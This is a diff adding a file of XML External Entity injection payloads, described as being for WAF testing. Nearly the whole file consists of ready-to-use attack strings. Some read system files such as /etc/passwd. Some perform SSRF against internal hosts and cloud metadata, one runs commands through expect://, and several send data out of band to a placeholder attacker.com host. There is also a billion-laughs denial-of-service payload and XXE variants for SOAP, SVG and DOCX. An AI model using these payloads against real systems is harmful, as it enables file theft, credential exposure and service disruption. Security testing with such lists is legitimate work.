@@ -1,0 +1,142 @@
+# XXE (XML External Entity) Payloads
+# XML External Entity injection for WAF testing
+
+# Basic XXE
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+
+# XXE with Parameter Entity
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
+<foo>test</foo>
+
+# XXE File Read
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
+<foo>&xxe;</foo>
+
+# XXE SSRF
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/admin">]>
+<foo>&xxe;</foo>
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+<foo>&xxe;</foo>
+
+# XXE with External DTD
+<?xml version="1.0"?>
+<!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">
+<foo>&xxe;</foo>
+
+# Blind XXE
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe">%xxe;]>
+<foo>test</foo>
+
+# XXE with PHP Wrapper
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
+<foo>&xxe;</foo>
+
+# XXE with Expect
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
+<foo>&xxe;</foo>
+
+# XXE OOB (Out-of-Band)
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+%dtd;
+]>
+<foo>&send;</foo>
+
+# XXE with Error-Based
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+]>
+<foo>test</foo>
+
+# XXE with CDATA
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % all "<!ENTITY send '%start;%file;%end;'>">
+%all;
+]>
+<foo>&send;</foo>
+
+# XXE with UTF-7
+<?xml version="1.0" encoding="UTF-7"?>
++ADw-+ACE-DOCTYPE foo+AFs-+ADw-+ACE-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-
++ADw-foo+AD4-+ACY-xxe+ADs-+ADw-/foo+AD4-
+
+# XXE with UTF-16
+<?xml version="1.0" encoding="UTF-16"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+
+# XXE Billion Laughs (DoS)
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+<!ENTITY lol "lol">
+<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+]>
+<lolz>&lol4;</lolz>
+
+# XXE with XInclude
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
+
+# XXE in SOAP
+<soap:Body>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+</soap:Body>
+
+# XXE in SVG
+<svg xmlns="http://www.w3.org/2000/svg">
+<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<text>&xxe;</text>
+</svg>
+
+# XXE in DOCX
+[Content_Types].xml:
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<Types>&xxe;</Types>
+
+# XXE with Data URI
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8gV29ybGQ=">]>
+<foo>&xxe;</foo>
+
+# XXE with JAR Protocol
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:file:///path/to/file.jar!/resource">]>
+<foo>&xxe;</foo>
+
+# XXE with FTP
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://attacker.com/file">]>
+<foo>&xxe;</foo>
+
+# XXE with Gopher
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:25/_MAIL%20FROM">]>
+<foo>&xxe;</foo>
